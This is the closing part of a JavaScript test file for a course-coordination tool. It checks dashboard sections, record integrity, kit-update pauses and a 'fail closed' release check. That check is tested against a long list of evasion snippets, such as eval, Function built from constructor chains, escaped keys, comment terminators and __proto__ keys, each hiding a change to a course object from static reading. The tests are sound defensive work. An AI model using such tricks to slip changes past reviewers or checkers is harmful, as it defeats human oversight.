const ddOut = cp.execFileSync(process.execPath, [path.join(__dirname, 'coord.js'), 'dashboard', '--offline', '--no-cache', '--now', '2026-11-06T15:00:00Z'], {encoding: 'utf8'});
check(/## Courses/.test(ddOut) && /## Improvements/.test(ddOut) && /## Approvals/.test(ddOut) && /## Automation activity/.test(ddOut), 'the dashboard has its four sections');
check(/PHAR 4346.*exam-approaching.*Exam 1 2026-11-09 09:00.*Final Exam 2026-12-07.*\| Exam 1 \|.*Exam 2 2026-11-16 \(planned\); Exam 3 2026-11-23 \(planned\); Final Exam 2026-12-07 \(planned\)/.test(ddOut), 'DEENT row: next Exam 1, final 12/07, Exam 1 published, the other three known and not released');
check(/Kit coordinator daily.*proposed \(not configured\)/.test(ddOut), 'the proposed coordinator task shows as not configured');

console.log('\n=== The records ===');
const ids = new Set();
for(const c of cfg.courses){
  check(!ids.has(c.id), `${c.id}: id unique`); ids.add(c.id);
  const ex = c.schedule.exams;
  check(ex.every(e => C.RELEASE.includes(e.status)), `${c.id}: every exam has a known release status`);
  check(ex.filter(e => e.final).length <= 1, `${c.id}: at most one final`);
  check(ex.every(e => e.source), `${c.id}: every exam names its source`);
  check(ex.every(e => e.date == null || C.validDate(e.date)), `${c.id}: every recorded date is a real date`);
  check(ex.every(e => e.status !== 'published' || e.siteId != null), `${c.id}: every published exam names its id on the site`);
  check(!c.override || C.STATUSES.includes(c.override.status), `${c.id}: override status valid`);
  check(typeof c.pagesBranch === 'string', `${c.id}: names the branch Pages serves`);
}
const imp = read('improvements.json').items, iid = new Set();
const ST = ['discovered', 'evaluating', 'proposed', 'implementing', 'testing', 'awaiting-approval', 'adopted', 'deferred', 'rejected'];
const KD = ['course-specific', 'optional-feature', 'core-change', 'skill-guidance'];
for(const i of imp){
  check(!iid.has(i.id) && ST.includes(i.status) && KD.includes(i.kind) && i.sourceRepo && i.evidence && i.existsInKit, `improvement ${i.id}: unique, valid status and kind, source, evidence and kit comparison recorded`, i);
  iid.add(i.id);
  check((i.candidateCourses || []).every(c => ids.has(c)), `improvement ${i.id}: candidate courses are registered`);
}
const st = read('state.json').checkpoints;
check(cfg.courses.every(c => c.id in st) && Object.keys(st).every(k => ids.has(k)), 'every course has a checkpoint entry and every checkpoint a course');
const au = read('automations.json').automations;
check(au.every(a => a.name && a.state && a.verified), 'every automation records its state and what has been verified');
const blob = ['courses.json', 'state.json', 'improvements.json', 'automations.json', 'README.md', 'RUN.md'].map(f => fs.readFileSync(path.join(__dirname, f), 'utf8')).join('\n');
check(!C.hasSecret(blob) && !/"score"|"grade"|"answers"\s*:/.test(blob), 'the records hold no credentials, scores, grades or answer histories');

console.log('\n=== The release check fails closed: a file it cannot read completely is never OK ===');
{
  const E1 = "{id:'exam1', name:'Exam 1'}", E2 = "{id:'exam2', name:'Exam 2'}";
  const plain = `const COURSE = {id:'deent', exams:[${E1}], activeExam:'exam1', kit:{core:'25c643d'}};`;
  const base = C.checkPublished(deent, C.parseCourse(plain));
  check(base.ok === true, 'a plain literal listing only Exam 1 passes', base);
  const cases = [
    ['exams from a variable', `const EX = [${E1}, ${E2}]; const COURSE = {exams: EX, activeExam:'exam1'};`],
    ['shorthand exams', `const exams = [${E1}, ${E2}]; const COURSE = {exams, activeExam:'exam1'};`],
    ['spread of a base object', `const BASE = {exams:[${E1}, ${E2}]}; const COURSE = {...BASE, activeExam:'exam1'};`],
    ['computed exams key', `const COURSE = {['exams']: [${E1}, ${E2}], activeExam:'exam1'};`],
    ['getter for exams', `const COURSE = {get exams(){ return [${E1}, ${E2}]; }, activeExam:'exam1'};`],
    ['a spread entry in the array', `const MORE = [${E2}]; const COURSE = {exams:[${E1}, ...MORE], activeExam:'exam1'};`],
    ['a variable entry in the array', `const X = ${E2}; const COURSE = {exams:[${E1}, X], activeExam:'exam1'};`],
    ['a computed id', `const COURSE = {exams:[${E1}, {id:'exam'+2}], activeExam:'exam1'};`],
    ['a template id', "const n = 2; const COURSE = {exams:[" + E1 + ", {id:`exam${n}`}], activeExam:'exam1'};"],
    ['activeExam computed', `const COURSE = {exams:[${E1}], activeExam:['exam2'][0]};`],
    ['two activeExam keys', `const COURSE = {exams:[${E1}], activeExam:'exam1', activeExam:'exam2'};`],
    ['a repeated exams key', `const COURSE = {exams:[${E1}], exams:[${E1}, ${E2}], activeExam:'exam1'};`],
    ['a repeated quoted exams key', `const COURSE = {exams:[${E1}], 'exams':[${E1}, ${E2}], activeExam:'exam1'};`],
    ['a repeated id in an exam', `const COURSE = {exams:[{id:'exam1', id:'exam2'}], activeExam:'exam1'};`],
    ['push after the literal', `${plain}\nCOURSE.exams.push(${E2});`],
    ['activeExam set after the literal', `${plain}\nCOURSE.activeExam = 'exam2';`],
    ['Object.assign after the literal', `${plain}\nObject.assign(COURSE, {exams:[${E1}, ${E2}]});`],
    ['window.COURSE replaced later', `${plain}\nwindow.COURSE = {exams:[${E1}, ${E2}], activeExam:'exam2'};`],
    ['a second COURSE literal', `${plain}\nCOURSE = {exams:[${E2}], activeExam:'exam2'};`],
    ['concat on the array', `const COURSE = {exams:[${E1}].concat([${E2}]), activeExam:'exam1'};`],
    ['getter for activeExam', `const COURSE = {exams:[${E1}], get activeExam(){ return 'exam2'; }};`],
    ['an alias that changes an exam', `${plain}\n{ const E = COURSE.exams[0]; E.id = 'exam2'; }`],
    ['an HTML-comment decoy before the real literal', `<!-- COURSE = {exams:[${E1}], activeExam:'exam1'} -->\nconst COURSE = {exams:[${E1}, ${E2}], activeExam:'exam2'};`],
    ['the literal used in an expression', `const COURSE = {exams:[${E1}], activeExam:'exam1'} || {exams:[${E2}]};`],
    ['no exams property', `const COURSE = {activeExam:'exam1'};`]
  ];
  for(const [label, src] of cases){
    let r;
    try { r = C.checkPublished(deent, C.parseCourse(src)); } catch(e){ r = {ok: null, threw: e.message}; }
    check(r.ok !== true, `not OK: ${label}`, r);
  }
  // the second independent review's bypasses (2026-11-06): each would make the deployed page list
  // or open on exam2 while a plain reading shows exam1
  const CR = String.fromCharCode(13), LS = String.fromCharCode(0x2028), BT = String.fromCharCode(96), BS = String.fromCharCode(92);
  const bypasses = [
    ['a duplicate exams key written with quotes', `const COURSE = {exams:[${E1}], 'exams':[${E1}, ${E2}], activeExam:'exam1'};`],
    ['activeExam repeated with a quoted key', `const COURSE = {exams:[${E1}, ${E2}], activeExam:'exam1', 'activeExam':'exam2'};`],
    ['an id repeated with a quoted key', `const COURSE = {exams:[{id:'exam1', 'id':'exam2'}], activeExam:'exam1'};`],
    ['a hex-escaped exams key', `const COURSE = {exams:[${E1}], '${BS}x65xams':[${E1}, ${E2}], activeExam:'exam1'};`],
    ['an octal-escaped exams key', `const COURSE = {exams:[${E1}], '${BS}145xams':[${E1}, ${E2}], activeExam:'exam1'};`],
    ['a line continuation inside the exams key', `const COURSE = {exams:[${E1}], 'ex${BS}\nams':[${E1}, ${E2}], activeExam:'exam1'};`],
    ['an escaped exam id', `const COURSE = {exams:[${E1}, {id:'exam${BS}u0032'}], activeExam:'exam1'};`],
    ['a template substitution that runs code', `${plain}\nconst label = ${BT}\${COURSE.exams.push(${E2})}${BT};`],
    ['a template whose substitution hides a backtick, then code', `${plain}\nconst s = ${BT}\${"${BT}"}${BT}; COURSE.exams.push(${E2});`],
    ['eval of a string', `${plain}\neval("COURSE.exams.push(${E2.replace(/'/g, "\\\\'")})");`],
    ['indirect eval', `${plain}\n(0, eval)("COURSE.activeExam = 'exam2'");`],
    ['Function from a string', `${plain}\nFunction("COURSE.activeExam = 'exam2'")();`],
    ['a unicode-escaped identifier', `${plain}\n${BS}u0043OURSE.exams.push(${E2});`],
    ['an ambiguous slash after a brace', `const n = {} / 1; ${plain} COURSE.exams.push(${E2}); const z = 2 / 3;`],
    ['an ambiguous slash after ++', `let i = 0; i++ / 2; ${plain} COURSE.exams.push(${E2}); const z = 2 / 3;`],
    ['a carriage return ending a line comment', `${plain}\n// note${CR}COURSE.exams.push(${E2});`],
    ['a Unicode line separator ending a line comment', `${plain}\n// note${LS}COURSE.exams.push(${E2});`],
    ['var COURSE changed through window', `var COURSE = {exams:[${E1}], activeExam:'exam1'};\nwindow['COURSE'].exams.push(${E2});`],
    ['var COURSE changed through a computed global name', `var COURSE = {exams:[${E1}], activeExam:'exam1'};\nglobalThis['COU'+'RSE'].exams.push(${E2});`],
    ['Object.defineProperty on the global', `${plain}\nObject.defineProperty(globalThis, 'x', {get(){ COURSE.exams.push(${E2}); }});`],
    ['a timer that changes it later', `${plain}\nsetTimeout(() => { COURSE.activeExam = 'exam2'; });`],
    ['var COURSE changed through this with a computed name', `var COURSE = {exams:[${E1}], activeExam:'exam1'};\nthis['COU'+'RSE'].exams.push(${E2});`],
    ['var COURSE changed through this.COURSE', `var COURSE = {exams:[${E1}], activeExam:'exam1'};\nthis.COURSE.activeExam = 'exam2';`],
    ['Function reached through a prototype constructor', `var COURSE = {exams:[${E1}], activeExam:'exam1'};\nObject.getPrototypeOf(()=>0).constructor('return this')()['COU'+'RSE'].exams.push(${E2});`],
    ['Function reached through [].constructor.constructor', `var COURSE = {exams:[${E1}], activeExam:'exam1'};\n[].constructor.constructor('return this')()['COU'+'RSE'].exams.push(${E2});`],
    ['Function reached through a computed member name', `var COURSE = {exams:[${E1}], activeExam:'exam1'};\n(()=>0)['constru'+'ctor']('return this')()['COU'+'RSE'].exams.push(${E2});`],
    ['Function with a split code string', `${plain}\n(()=>0)['constru'+'ctor']('COU'+'RSE.exams.push({id:"exam2"})')();`],
    ['Function with optional chaining in the code string', `${plain}\n(()=>0).constructor('COURSE?.exams.push({id:"exam2"})')();`],
    ['Function with a hex-escaped code string', `${plain}\n(()=>0).constructor('${BS}x43OURSE.exams.push({id:"exam2"})')();`],
    ['a __proto__ key supplying activeExam', `const COURSE = {exams:[${E1}], __proto__:{activeExam:'exam2'}};`],
    ['a call inside the literal', `const COURSE = {exams:[${E1}], activeExam:'exam1', title: String('x')};`],
    ['an arrow inside the literal', `const COURSE = {exams:[${E1}], activeExam:'exam1', f: () => 1};`],
    ['a stray identifier value inside the literal', `const COURSE = {exams:[${E1}], activeExam:'exam1', x: undefined};`],
    ['a second harmless statement after the literal', `${plain}\nconst other = 1;`]
  ];
  let passed = 0;
  for(const [label, src] of bypasses){
    let r;
    try { r = C.checkPublished(deent, C.parseCourse(src)); } catch(e){ r = {ok: null, threw: e.message}; }
    if(r.ok !== true) passed++;
    check(r.ok !== true, `bypass not OK: ${label}`, r);
  }
  check(passed === bypasses.length, `every one of the ${bypasses.length} bypasses is refused`);
  const thisDecl = C.checkPublished(deent, C.parseCourse(`this.COURSE = {exams:[${E1}], activeExam:'exam1', kit:{core:'25c643d'}};`));
  check(thisDecl.ok === true, 'this.COURSE = {...} as the declaration still reads completely', thisDecl);
  // what a real file may contain and still read completely
  const realistic = `const COURSE = {id:'deent', title:'COURSE 0000 — Course name', blurb:'Dr. Smith${BS}'s recording; see ${BT}guide${BT}', exams:[${E1}], activeExam:'exam1', kit:{core:'25c643d'}};`;
  const rr = C.checkPublished(deent, C.parseCourse(realistic));
  check(rr.ok === true, 'a file with an escaped apostrophe in a description, the word COURSE in a title and a plain template string reads completely', rr);
  const unread = C.checkPublished(deent, C.parseCourse(`${plain}\nCOURSE.activeExam = 'exam2';`));
  check(unread.ok === null && unread.notChecked === true && unread.problems.some(p => /not checked/.test(p)), 'a file that may change COURSE after the literal is "not checked" (ok: null), with the reason', unread);
  // the kit's own files: the template passes; template-unset (which changes an exam after the literal) is not checked
  const tpl = fs.readFileSync(path.join(__dirname, '..', 'template', 'course.js'), 'utf8');
  const tco = C.parseCourse(tpl);
  check(tco.incomplete.length === 0 && tco.exams.length > 0, 'the kit template course.js reads completely', tco.incomplete);
  const tun = C.parseCourse(tpl + "\n;{ const E = COURSE.exams[0]; E.questions = null; E.pools.forEach(p => { p.marks = null; }); }\n");
  check(tun.incomplete.some(x => /referenced/.test(x)), 'the template-unset course (which changes an exam after the literal) is not checked: it is a CI scratch course, never a registered one', tun.incomplete);
  let threw = false; try { C.parseCourse('const X = 1;'); } catch(e){ threw = /no object literal/.test(e.message); }
  check(threw, 'a file with no COURSE literal is an error the callers report, not OK');
}

console.log('\n=== Kit-update previews: a pause for one course ===');
const kp = cfg.courses.map(C.kitUpdatePolicy);
const kd = kp.find(x => x.course === 'deent');
check(kd.previews === 'paused' && kd.pagesBranch === 'main' && /working branch/.test(kd.reason) && /verify the approved course baseline/.test(kd.liftWhen) && /no pending preview/.test(kd.liftWhen) && kd.source, 'DEENT: kit-update previews paused, with the reason, how the pause is lifted, its source, and main as the Pages branch', kd);
check(kp.filter(x => x.course !== 'deent').every(x => x.previews === 'active'), 'every other course: kit-update previews active (no change)', kp);
check(cfg.courses.every(c => (c.pagesBranch || 'main') === 'main'), 'every course names main as the branch Pages serves');
for(const [field, re] of [['reason', /needs reason/], ['liftWhen', /needs liftWhen/], ['source', /needs source/]]){
  const x = clone(deent); delete x.kitUpdate[field];
  let refused = false; try { C.kitUpdatePolicy(x); } catch(e){ refused = re.test(e.message); }
  check(refused, `a pause without ${field} is refused`);
}
const bs = clone(deent); bs.kitUpdate.since = 'soon';
let t4 = false; try { C.kitUpdatePolicy(bs); } catch(e){ t4 = /not a date/.test(e.message); }
check(t4, 'a pause whose since is not a date is refused');
const nv = clone(deent); nv.kitUpdate.previews = 'off';
let t3 = false; try { C.kitUpdatePolicy(nv); } catch(e){ t3 = /must be one of/.test(e.message); }
check(t3, 'an unknown kit-update state is refused');
const na = clone(deent); delete na.kitUpdate;
check(C.kitUpdatePolicy(na).previews === 'active', 'no kitUpdate record: previews active');
const dc = deent.counts || [];
check(dc.length === 2 && dc.some(x => x.where === 'published' && x.ref.startsWith('main ') && x.source) && dc.some(x => x.where === 'unreleased' && x.ref.startsWith(deent.workingBranch + ' ') && x.source), 'DEENT question counts are labelled by where they come from (published on main, unreleased on the working branch), each with its source', dc);
const kj = JSON.parse(cp.execFileSync(process.execPath, [path.join(__dirname, 'coord.js'), 'kitupdate', '--json'], {encoding: 'utf8'}));
check(kj.length === cfg.courses.length && kj.filter(x => x.previews === 'paused').map(x => x.course).join() === 'deent', '`coord.js kitupdate --json` lists every course, with only DEENT paused', kj.map(x => x.course + ':' + x.previews));
const kt = cp.execFileSync(process.execPath, [path.join(__dirname, 'coord.js'), 'kitupdate'], {encoding: 'utf8'});
check(/deent\s+kit-update previews paused since 2026-11-06/.test(kt) && /reason: /.test(kt) && /lifted: /.test(kt), '`coord.js kitupdate` prints the pause with its reason and how it is lifted');
const badRec = clone(deent); badRec.kitUpdate.previews = 'Paused';
const bst = C.kitUpdateState(badRec);
check(bst.previews === 'invalid' && /must be one of/.test(bst.error), 'an invalid kitUpdate record is reported as invalid for its course, not thrown', bst);
{
  // the command on a copy of the records with one invalid record: it names that course, still lists the others, and exits 1
  const dir = fs.mkdtempSync(path.join(TMP, 'kitupdate-'));
  for(const f of ['coord.js', 'state.json', 'improvements.json', 'automations.json']) fs.copyFileSync(path.join(__dirname, f), path.join(dir, f));
  const bad = clone(cfg); bad.courses.find(c => c.id === 'deent').kitUpdate.previews = 'Paused';
  fs.writeFileSync(path.join(dir, 'courses.json'), JSON.stringify(bad));
  const r = cp.spawnSync(process.execPath, [path.join(dir, 'coord.js'), 'kitupdate', '--json'], {encoding: 'utf8'});
  const k = (() => { try { return JSON.parse(r.stdout); } catch(e){ return null; } })();
  check(r.status === 1 && k && k.length === cfg.courses.length && k.find(x => x.course === 'deent').previews === 'invalid' && k.filter(x => x.course !== 'deent').every(x => x.previews === 'active'), '`coord.js kitupdate` with an invalid record: that course invalid, the others listed, exit 1 (the run then builds no preview)', {status: r.status, k});
  const d = C.dashboard(T('2026-11-06T15:00:00Z'), {offline: true, cache: null, io: {}});
  check(d.courses.length === cfg.courses.length, 'the dashboard still lists every course');
}
const ddOff = C.dashboard(T('2026-11-06T15:00:00Z'), {offline: true, cache: null});
check(ddOff.courses.find(c => c.id === 'deent').kitUpdate.previews === 'paused' && /kit-update previews paused since 2026-11-06/.test(C.md(ddOff)), 'the dashboard\'s DEENT row says kit-update previews are paused');
check(ddOff.courses.filter(c => c.id !== 'deent').every(c => c.kitUpdate.previews === 'active') && (C.md(ddOff).match(/kit-update previews paused/g) || []).length === 1, 'the dashboard shows no pause for the other courses');

fs.rmSync(TMP, {recursive: true, force: true});
console.log(fails ? `FAIL: coord_test.js: ${fails} of ${fails + passes} checks failed` : `PASS: coord_test.js: ${passes} checks passed`);
process.exitCode = fails ? 1 : 0;
